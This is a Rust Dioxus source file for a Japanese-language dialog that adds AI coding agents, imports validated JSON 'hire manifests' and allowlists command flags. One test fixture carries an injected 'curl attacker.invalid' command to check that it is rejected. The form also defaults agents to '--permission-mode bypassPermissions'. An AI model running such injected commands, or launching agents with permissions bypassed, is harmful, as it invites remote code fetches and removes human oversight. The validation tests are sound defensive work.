use dioxus::prelude::*;
use md_web_contracts::domains::office_ui::{
    Accent, OfficeAgentSpawnRequest, OfficeCharacter, OfficeHireManifest,
};
use md_web_contracts::domains::pty_agents::{AgentProvider, AgentRole, SpawnAgentRequest};

const STEPS: [(&str, &str); 4] = [
    ("1 基本情報", "名前・キャラクター・色"),
    ("2 作業場所", "フォルダー・分離・再開"),
    ("3 エンジン", "プロバイダー・モデル・コマンド"),
    ("4 役割設定", "説明・ゴール"),
];
const MAX_HIRE_BYTES: u64 = 64 * 1024;
const HIRE_PROMPT: &str = r#"AIエージェント用の採用マニフェストをJSONだけで作成してください。
specは必ず "munder-difflin/hire@1"。name、description、goal、provider、model、character、accent、isolateを設定します。
providerは claude / codex / antigravity / cursor のいずれか。commandや秘密情報は含めません。
出力例:
{"spec":"munder-difflin/hire@1","name":"Andy","description":"ドキュメント担当","goal":"READMEを実装と同期する","provider":"codex","model":"gpt-5.6","character":"andy","accent":"mint","isolate":false}"#;

#[component]
pub(super) fn AddAgentModal(
    spawning: bool,
    on_cancel: EventHandler<()>,
    on_spawn: EventHandler<OfficeAgentSpawnRequest>,
) -> Element {
    let mut step = use_signal(|| 0_usize);
    let mut name = use_signal(String::new);
    let mut character = use_signal(|| OfficeCharacter::Jim);
    let mut accent = use_signal(|| Accent::Sky);
    let mut project = use_signal(String::new);
    let mut workspace = use_signal(String::new);
    let mut isolate = use_signal(|| false);
    let mut resume_id = use_signal(String::new);
    let mut provider = use_signal(|| AgentProvider::Claude);
    let mut model = use_signal(String::new);
    let mut command = use_signal(|| String::from("claude"));
    let mut arguments = use_signal(|| String::from("--permission-mode\nbypassPermissions"));
    let mut columns = use_signal(|| String::from("100"));
    let mut rows = use_signal(|| String::from("30"));
    let mut description = use_signal(String::new);
    let mut goal = use_signal(String::new);
    let mut show_hire_prompt = use_signal(|| false);
    let mut copied_prompt = use_signal(|| false);
    let mut form_error = use_signal(|| None::<String>);
    let mut import_status = use_signal(|| None::<String>);

    rsx! {
        AddAgentModalFocus {}
        div {
            class: "add-agent-backdrop",
            role: "presentation",
            onclick: move |_| on_cancel.call(()),
            article {
                class: "add-agent-modal",
                role: "dialog",
                aria_modal: "true",
                aria_labelledby: "add-agent-title",
                tabindex: "-1",
                onclick: move |event| event.stop_propagation(),
                onkeydown: move |event| {
                    if event.key() == Key::Escape {
                        on_cancel.call(());
                    }
                },
                header { id: "add-agent-title", "エージェントを追加" }
                div { class: "add-agent-modal__body",
                    nav { class: "add-agent-modal__steps", aria_label: "追加手順",
                        for (index, (title, subtitle)) in STEPS.iter().enumerate() {
                            button {
                                class: if step() == index { "is-active" } else { "" },
                                r#type: "button",
                                onclick: move |_| step.set(index),
                                strong { {title.to_string()} }
                                small { {subtitle.to_string()} }
                            }
                        }
                    }
                    section { class: "add-agent-modal__panel",
                        if step() == 0 {
                            h2 { "基本情報" }
                            label { "名前", input { value: "{name}", oninput: move |event| name.set(event.value()) } }
                            fieldset { legend { "キャラクター" }
                                div { class: "add-agent-modal__choices",
                                    for (label, choice) in character_choices() {
                                        button {
                                            class: if character() == choice { "is-selected" } else { "" },
                                            r#type: "button",
                                            onclick: move |_| {
                                                character.set(choice);
                                                name.set(String::from(label));
                                            },
                                            canvas {
                                                width: "36",
                                                height: "56",
                                                aria_hidden: "true",
                                                "data-office-portrait": character_key(choice),
                                            }
                                            span { "{label}" }
                                        }
                                    }
                                }
                            }
                            fieldset { legend { "アクセントカラー" }
                                div { class: "add-agent-modal__swatches", aria_label: "アクセントカラー",
                                    for (label, choice) in accent_choices() {
                                        button {
                                            class: if accent() == choice { "is-selected" } else { "" },
                                            r#type: "button",
                                            title: "{label}",
                                            "data-color": label,
                                            onclick: move |_| accent.set(choice),
                                        }
                                    }
                                }
                            }
                        } else if step() == 1 {
                            h2 { "作業場所" }
                            label { "プロジェクト", input { value: "{project}", placeholder: "プロジェクト名", oninput: move |event| project.set(event.value()) } }
                            label { "フォルダー", input { value: "{workspace}", placeholder: "/workspace/project", oninput: move |event| workspace.set(event.value()) } }
                            label { class: "add-agent-modal__check", input { r#type: "checkbox", checked: isolate(), onchange: move |event| isolate.set(event.checked()) } "Git分離（専用worktree）" }
                            label { "再開するセッションID（任意）", input { value: "{resume_id}", oninput: move |event| resume_id.set(event.value()) } }
                        } else if step() == 2 {
                            h2 { "エンジン" }
                            fieldset { legend { "プロバイダー" }
                                div { class: "add-agent-modal__choices",
                                    for (label, choice, executable) in provider_choices() {
                                        button {
                                            class: if provider() == choice { "is-selected" } else { "" },
                                            r#type: "button",
                                            onclick: move |_| {
                                                provider.set(choice);
                                                command.set(String::from(executable));
                                            },
                                            "{label}"
                                        }
                                    }
                                }
                            }
                            label { "モデル（任意）", input { value: "{model}", oninput: move |event| model.set(event.value()) } }
                            label { "コマンド", input { value: "{command}", oninput: move |event| command.set(event.value()) } }
                            label { "引数（1行につき1つ）", textarea { rows: "4", value: "{arguments}", oninput: move |event| arguments.set(event.value()) } }
                            div { class: "add-agent-modal__dimensions",
                                label { "列", input { r#type: "number", min: "1", max: "65535", value: "{columns}", oninput: move |event| columns.set(event.value()) } }
                                label { "行", input { r#type: "number", min: "1", max: "65535", value: "{rows}", oninput: move |event| rows.set(event.value()) } }
                            }
                        } else {
                            h2 { "役割設定" }
                            label { "説明", textarea { rows: "4", value: "{description}", oninput: move |event| description.set(event.value()) } }
                            label { "ゴール", textarea { rows: "5", value: "{goal}", oninput: move |event| goal.set(event.value()) } }
                        }
                    }
                }
                aside { class: "add-agent-modal__import",
                    p { "採用マニフェストを読み込むと、生成前にすべての項目を確認できます。" }
                    button {
                        class: "office-button office-button--secondary",
                        r#type: "button",
                        aria_expanded: show_hire_prompt().to_string(),
                        onclick: move |_| show_hire_prompt.set(!show_hire_prompt()),
                        if show_hire_prompt() { "AI用プロンプトを隠す" } else { "AIで生成…" }
                    }
                    if show_hire_prompt() {
                        label { "AI用プロンプト",
                            textarea {
                                class: "add-agent-modal__hire-prompt",
                                readonly: true,
                                rows: "8",
                                value: HIRE_PROMPT,
                            }
                        }
                        button {
                            class: "office-button office-button--secondary",
                            r#type: "button",
                            onclick: move |_| {
                                spawn(async move {
                                    copied_prompt.set(copy_hire_prompt().await);
                                });
                            },
                            if copied_prompt() { "コピー済み ✓" } else { "プロンプトをコピー" }
                        }
                    }
                    if let Some(status) = import_status() {
                        p { class: "add-agent-modal__notice", role: "status", {status} }
                    }
                    if let Some(error) = form_error() {
                        p { class: "add-agent-modal__error", role: "alert", {error} }
                    }
                }
                footer {
                    label { class: "office-button office-button--secondary add-agent-modal__file",
                        "採用設定を読込…"
                        input {
                            r#type: "file",
                            accept: "application/json,.json",
                            multiple: true,
                            disabled: spawning,
                            onchange: move |event| {
                                let files = event.files();
                                if files.is_empty() { return; }
                                spawn(async move {
                                    form_error.set(None);
                                    import_status.set(None);
                                    let mut failures = Vec::new();
                                    for file in files {
                                        if file.size() > MAX_HIRE_BYTES {
                                            failures.push(format!("{}: 64KiBを超えています", file.name()));
                                            continue;
                                        }
                                        let Ok(text) = file.read_string().await else {
                                            failures.push(format!("{}: 読み込めません", file.name()));
                                            continue;
                                        };
                                        match parse_hire_manifest(&text) {
                                            Ok(manifest) => {
                                                apply_hire_manifest(manifest, HireFormSignals {
                                                    name,
                                                    character,
                                                    accent,
                                                    isolate,
                                                    provider,
                                                    model,
                                                    command,
                                                    arguments,
                                                    description,
                                                    goal,
                                                });
                                                step.set(0);
                                                import_status.set(Some(format!("{} を読み込みました。内容を確認してから起動してください。", file.name())));
                                                return;
                                            }
                                            Err(error) => failures.push(format!("{}: {error}", file.name())),
                                        }
                                    }
                                    form_error.set(Some(failures.join(" · ")));
                                });
                            },
                        }
                    }
                    span {}
                    button { class: "office-button office-button--secondary", r#type: "button", disabled: spawning, onclick: move |_| on_cancel.call(()), "キャンセル" }
                    button {
                        class: "office-button office-button--primary",
                        r#type: "button",
                        disabled: spawning,
                        "data-ui-state": if spawning { "loading" } else { "default" },
                        onclick: move |_| {
                            form_error.set(None);
                            if name.read().trim().is_empty() {
                                form_error.set(Some(String::from("名前を入力してください")));
                                step.set(0);
                                return;
                            }
                            if workspace.read().trim().is_empty() {
                                form_error.set(Some(String::from("フォルダーを入力してください")));
                                step.set(1);
                                return;
                            }
                            if command.read().trim().is_empty() {
                                form_error.set(Some(String::from("コマンドを入力してください")));
                                step.set(2);
                                return;
                            }
                            let Ok(cols) = columns.read().parse::<u16>() else {
                                form_error.set(Some(String::from("列は1〜65535で入力してください")));
                                step.set(2);
                                return;
                            };
                            let Ok(rows) = rows.read().parse::<u16>() else {
                                form_error.set(Some(String::from("行は1〜65535で入力してください")));
                                step.set(2);
                                return;
                            };
                            on_spawn.call(OfficeAgentSpawnRequest {
                                process: SpawnAgentRequest {
                                    id: String::new(),
                                    name: name.read().clone(),
                                    provider: provider(),
                                    role: AgentRole::default(),
                                    description: description.read().clone(),
                                    cwd: workspace.read().clone(),
                                    command: command.read().clone(),
                                    args: arguments.read().lines().map(String::from).collect(),
                                    model: nonempty(model.read().as_str()),
                                    cols,
                                    rows,
                                    isolate: isolate(),
                                    resume: !resume_id.read().is_empty(),
                                    require_resume: false,
                                    resume_session_id: nonempty(resume_id.read().as_str()),
                                },
                                character: character(),
                                accent: accent(),
                                project: project.read().clone(),
                                goal: goal.read().clone(),
                            });
                        },
                        if spawning { "起動中…" } else { "起動" }
                    }
                }
            }
        }
    }
}

#[component]
fn AddAgentModalFocus() -> Element {
    use_effect(move || {
        spawn(async move {
            let _ = document::eval(
                r#"
                globalThis.__munderAddAgentFocusCleanup?.();
                const dialog = document.querySelector(".add-agent-modal");
                if (!dialog) return;
                const focusable = () => [...dialog.querySelectorAll(
                  'button:not([disabled]), input:not([disabled]), textarea:not([disabled]), select:not([disabled]), [tabindex]:not([tabindex="-1"])'
                )].filter((element) => !element.hidden && element.getClientRects().length > 0);
                const initial = dialog.querySelector('input:not([type="file"])');
                const trap = (event) => {
                  if (event.key !== "Tab") return;
                  const items = focusable();
                  if (!items.length) return;
                  const first = initial || items[0];
                  const last = items[items.length - 1];
                  if (event.shiftKey && document.activeElement === first) {
                    event.preventDefault();
                    last.focus();
                  } else if (!event.shiftKey && document.activeElement === last) {
                    event.preventDefault();
                    first.focus();
                  }
                };
                dialog.addEventListener("keydown", trap);
                (initial || focusable()[0] || dialog).focus();
                globalThis.__munderAddAgentFocusCleanup = () => dialog.removeEventListener("keydown", trap);
                await new Promise(() => {});
                "#,
            )
            .join::<serde_json::Value>()
            .await;
        });
    });
    rsx! {}
}

async fn copy_hire_prompt() -> bool {
    let Ok(prompt) = serde_json::to_string(HIRE_PROMPT) else {
        return false;
    };
    document::eval(&format!(
        "await navigator.clipboard.writeText({prompt}); return true;"
    ))
    .join::<bool>()
    .await
    .unwrap_or(false)
}

fn parse_hire_manifest(text: &str) -> Result<OfficeHireManifest, String> {
    let manifest: OfficeHireManifest =
        serde_json::from_str(text).map_err(|_| String::from("JSON形式が正しくありません"))?;
    if manifest.spec != "munder-difflin/hire@1" {
        return Err(String::from("未対応のspecです"));
    }
    if manifest.name.trim().is_empty() || manifest.name.chars().count() > 40 {
        return Err(String::from("nameは1〜40文字で指定してください"));
    }
    if manifest
        .description
        .as_ref()
        .is_some_and(|value| value.chars().count() > 200)
        || manifest
            .goal
            .as_ref()
            .is_some_and(|value| value.chars().count() > 4_000)
        || manifest
            .model
            .as_ref()
            .is_some_and(|value| value.chars().count() > 80)
    {
        return Err(String::from("文字数上限を超えています"));
    }
    if manifest.provider == Some(AgentProvider::Custom) {
        return Err(String::from("custom providerは採用設定から指定できません"));
    }
    if !safe_hire_flags(&manifest.command_flags) {
        return Err(String::from("許可されていないcommandFlagsがあります"));
    }
    Ok(manifest)
}

fn safe_hire_flags(flags: &[String]) -> bool {
    if flags.len() > 16 {
        return false;
    }
    let mut accepts_value = false;
    for (index, token) in flags.iter().enumerate() {
        if token.is_empty()
            || token.len() > 100
            || token.contains([' ', '\t', '\n', ';', '|', '&', '`', '$', '<', '>'])
        {
            return false;
        }
        if token.starts_with('-') {
            if accepts_value {
                return false;
            }
            let (name, inline_value) = token
                .split_once('=')
                .map_or((token.as_str(), None), |(name, value)| (name, Some(value)));
            if !matches!(
                name,
                "--model" | "--max-turns" | "--output-format" | "--verbose"
            ) {
                return false;
            }
            if name == "--verbose" {
                if inline_value.is_some() {
                    return false;
                }
            } else if let Some(value) = inline_value {
                if value.is_empty() {
                    return false;
                }
            } else {
                accepts_value = true;
            }
        } else {
            if index == 0 || !accepts_value {
                return false;
            }
            accepts_value = false;
        }
    }
    !accepts_value
}

#[derive(Clone, Copy)]
struct HireFormSignals {
    name: Signal<String>,
    character: Signal<OfficeCharacter>,
    accent: Signal<Accent>,
    isolate: Signal<bool>,
    provider: Signal<AgentProvider>,
    model: Signal<String>,
    command: Signal<String>,
    arguments: Signal<String>,
    description: Signal<String>,
    goal: Signal<String>,
}

fn apply_hire_manifest(manifest: OfficeHireManifest, mut form: HireFormSignals) {
    form.name.set(manifest.name.clone());
    form.character.set(
        manifest
            .character
            .as_deref()
            .and_then(parse_character)
            .or_else(|| parse_character(&manifest.name.to_ascii_lowercase()))
            .unwrap_or(OfficeCharacter::Jim),
    );
    form.accent.set(
        manifest
            .accent
            .as_deref()
            .and_then(parse_accent)
            .unwrap_or(Accent::Sky),
    );
    form.isolate.set(manifest.isolate);
    let selected_provider = manifest.provider.unwrap_or(AgentProvider::Claude);
    form.provider.set(selected_provider);
    form.command
        .set(String::from(provider_executable(selected_provider)));
    form.model.set(manifest.model.unwrap_or_default());
    form.arguments.set(manifest.command_flags.join("\n"));
    form.description
        .set(manifest.description.unwrap_or_default());
    form.goal.set(manifest.goal.unwrap_or_default());
}

fn parse_character(value: &str) -> Option<OfficeCharacter> {
    Some(match value.to_ascii_lowercase().as_str() {
        "michael" => OfficeCharacter::Michael,
        "jim" => OfficeCharacter::Jim,
        "pam" => OfficeCharacter::Pam,
        "dwight" => OfficeCharacter::Dwight,
        "stanley" => OfficeCharacter::Stanley,
        "phyllis" => OfficeCharacter::Phyllis,
        "angela" => OfficeCharacter::Angela,
        "kevin" => OfficeCharacter::Kevin,
        "oscar" => OfficeCharacter::Oscar,
        "meredith" => OfficeCharacter::Meredith,
        "creed" => OfficeCharacter::Creed,
        "andy" => OfficeCharacter::Andy,
        "ryan" => OfficeCharacter::Ryan,
        "kelly" => OfficeCharacter::Kelly,
        "toby" => OfficeCharacter::Toby,
        "darryl" => OfficeCharacter::Darryl,
        _ => return None,
    })
}

fn parse_accent(value: &str) -> Option<Accent> {
    Some(match value.to_ascii_lowercase().as_str() {
        "coral" => Accent::Coral,
        "mint" => Accent::Mint,
        "sky" => Accent::Sky,
        "lemon" => Accent::Lemon,
        "lilac" => Accent::Lilac,
        "peach" => Accent::Peach,
        _ => return None,
    })
}

fn provider_executable(provider: AgentProvider) -> &'static str {
    match provider {
        AgentProvider::Claude => "claude",
        AgentProvider::Codex => "codex",
        AgentProvider::Grok => "grok",
        AgentProvider::Kimi => "kimi",
        AgentProvider::Gemini => "gemini",
        AgentProvider::Antigravity => "agy",
        AgentProvider::Qwen => "qwen",
        AgentProvider::OpenCode => "opencode",
        AgentProvider::Crush => "crush",
        AgentProvider::Pi => "pi",
        AgentProvider::Copilot => "copilot",
        AgentProvider::Cursor => "cursor-agent",
        AgentProvider::Custom => "",
    }
}

fn nonempty(value: &str) -> Option<String> {
    (!value.is_empty()).then(|| String::from(value))
}

fn character_choices() -> [(&'static str, OfficeCharacter); 16] {
    [
        ("Michael", OfficeCharacter::Michael),
        ("Jim", OfficeCharacter::Jim),
        ("Pam", OfficeCharacter::Pam),
        ("Dwight", OfficeCharacter::Dwight),
        ("Stanley", OfficeCharacter::Stanley),
        ("Phyllis", OfficeCharacter::Phyllis),
        ("Angela", OfficeCharacter::Angela),
        ("Kevin", OfficeCharacter::Kevin),
        ("Oscar", OfficeCharacter::Oscar),
        ("Meredith", OfficeCharacter::Meredith),
        ("Creed", OfficeCharacter::Creed),
        ("Andy", OfficeCharacter::Andy),
        ("Ryan", OfficeCharacter::Ryan),
        ("Kelly", OfficeCharacter::Kelly),
        ("Toby", OfficeCharacter::Toby),
        ("Darryl", OfficeCharacter::Darryl),
    ]
}

fn character_key(character: OfficeCharacter) -> &'static str {
    match character {
        OfficeCharacter::Michael => "michael",
        OfficeCharacter::Dwight => "dwight",
        OfficeCharacter::Pam => "pam",
        OfficeCharacter::Jim => "jim",
        OfficeCharacter::Stanley => "stanley",
        OfficeCharacter::Phyllis => "phyllis",
        OfficeCharacter::Angela => "angela",
        OfficeCharacter::Kevin => "kevin",
        OfficeCharacter::Oscar => "oscar",
        OfficeCharacter::Meredith => "meredith",
        OfficeCharacter::Creed => "creed",
        OfficeCharacter::Andy => "andy",
        OfficeCharacter::Ryan => "ryan",
        OfficeCharacter::Kelly => "kelly",
        OfficeCharacter::Toby => "toby",
        OfficeCharacter::Darryl => "darryl",
    }
}

fn accent_choices() -> [(&'static str, Accent); 6] {
    [
        ("coral", Accent::Coral),
        ("mint", Accent::Mint),
        ("sky", Accent::Sky),
        ("lemon", Accent::Lemon),
        ("lilac", Accent::Lilac),
        ("peach", Accent::Peach),
    ]
}

fn provider_choices() -> [(&'static str, AgentProvider, &'static str); 6] {
    [
        ("Claude Code", AgentProvider::Claude, "claude"),
        ("Codex · GPT", AgentProvider::Codex, "codex"),
        ("Gemini", AgentProvider::Gemini, "gemini"),
        ("Qwen", AgentProvider::Qwen, "qwen"),
        ("OpenCode", AgentProvider::OpenCode, "opencode"),
        ("Custom", AgentProvider::Custom, ""),
    ]
}

#[cfg(test)]
mod tests {
    use md_web_contracts::domains::office_ui::OfficeCharacter;
    use md_web_contracts::domains::pty_agents::AgentProvider;

    use super::{parse_character, parse_hire_manifest, safe_hire_flags};

    #[test]
    fn imported_hire_is_typed_and_review_only() {
        let Ok(manifest) = parse_hire_manifest(
            r#"{
                "spec":"munder-difflin/hire@1",
                "name":"Darryl",
                "provider":"codex",
                "character":"darryl",
                "accent":"mint",
                "isolate":false
            }"#,
        ) else {
            panic!("valid hire should parse");
        };

        assert_eq!(manifest.provider, Some(AgentProvider::Codex));
        assert_eq!(parse_character("darryl"), Some(OfficeCharacter::Darryl));
    }

    #[test]
    fn imported_hire_cannot_inject_a_command() {
        let result = parse_hire_manifest(
            r#"{
                "spec":"munder-difflin/hire@1",
                "name":"Mallory",
                "provider":"codex",
                "command":"curl attacker.invalid"
            }"#,
        );

        assert!(result.is_err());
    }

    #[test]
    fn imported_hire_flags_require_complete_allowlisted_pairs() {
        assert!(safe_hire_flags(&[
            String::from("--model"),
            String::from("gpt-5.6"),
            String::from("--verbose"),
        ]));
        assert!(!safe_hire_flags(&[String::from("--model")]));
        assert!(!safe_hire_flags(&[
            String::from("--verbose"),
            String::from("unexpected"),
        ]));
        assert!(!safe_hire_flags(&[String::from("--model=")]));
    }
}
